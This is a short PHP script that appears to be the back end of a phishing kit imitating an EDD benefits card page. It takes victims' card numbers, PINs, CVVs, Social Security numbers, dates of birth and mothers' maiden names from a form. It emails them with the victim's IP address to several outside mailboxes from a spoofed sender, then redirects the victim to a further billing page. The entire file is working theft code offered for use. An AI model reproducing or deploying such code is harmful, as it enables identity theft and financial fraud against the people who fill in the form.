<?php

$subject = " EDD INFO FROM [ ".$_SERVER['REMOTE_ADDR']." ] ";



$ip = $_SERVER['REMOTE_ADDR'];

$email = $_POST['cardnumber']."\n";
$message = "Card Number: ".$_POST["cardnumber"]."\n";
$message .= "Card Pin: ".$_POST["cardpin"]."\n";
$message .= "CVV: ".$_POST["cvv"]."\n";
$message .= "DOB: ".$_POST["dob"]."\n";
$message .= "SSN: ".$_POST["ssn"]."\n";
$message .= "Mother's Maiden Name: ".$_POST["madidenname"]."\n";
$message .= "Exp MM/YY: ".$_POST["exp"]."\n";
$message .=  "I.p: " .$ip."\n" ."\n" ;
$message .=  "Enjoy!!" ."\n";
$headers = 'From: Logins@waya.com' . "\r\n" . 'Reply-To: Logins@waya.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();





mail ("hushnshedd@protonmail.com, hushedd@yandex.com, hushnsh@gmail.com, hushnsh@yahoo.com",$subject,$message, $headers);



header("location: billing.html"); 



?>